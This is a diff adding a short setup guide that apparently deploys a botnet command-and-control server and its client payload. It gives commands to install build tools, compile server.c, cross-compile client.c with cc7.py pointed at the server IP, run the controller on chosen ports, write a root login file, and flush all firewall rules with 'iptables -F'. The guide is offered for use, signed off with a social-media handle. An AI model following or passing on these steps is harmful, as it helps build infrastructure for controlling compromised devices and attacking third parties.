@@ -1,0 +1,33 @@
+//Steps//									 
+1st Step: Edit the 0.0.0.0 inside the client.c file make sure to replace all.							 
+
+2nd Step: 
+Dependencies First
+and make sure we 
+got everything 
+updated.			   
+[root@Hostname ~]# yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+
+3rd Step: We have to compile the server side.
+[root@Hostname ~]# gcc server.c -o server -pthread
+
+4th Step: Compile the client side.
+[root@Hostname ~]# python cc7.py client.c [SERVER IP]
+
+5th Step: Now We Have To Screen The Server.
+[root@Hostname ~]# screen ./server 23 1 [PORT OF CHOOSING] Hint: i used 1337
+NOW PRESS CRTL - A+D
+
+6th Step: Create A Login.
+[root@Hostname ~]# echo root root1337 >>login.txt
+
+7th Step: Last Thing To Make Sure Its Running.
+
+[root@Hostname ~]# iptables -F
+
+Now goto putty and login with the Your ip and port and make sure its set up on raw instead ssh.
+
+9th Step: YOUR WELCOME YA NOOB :)
+Follow Me ON IG @873u
+
+
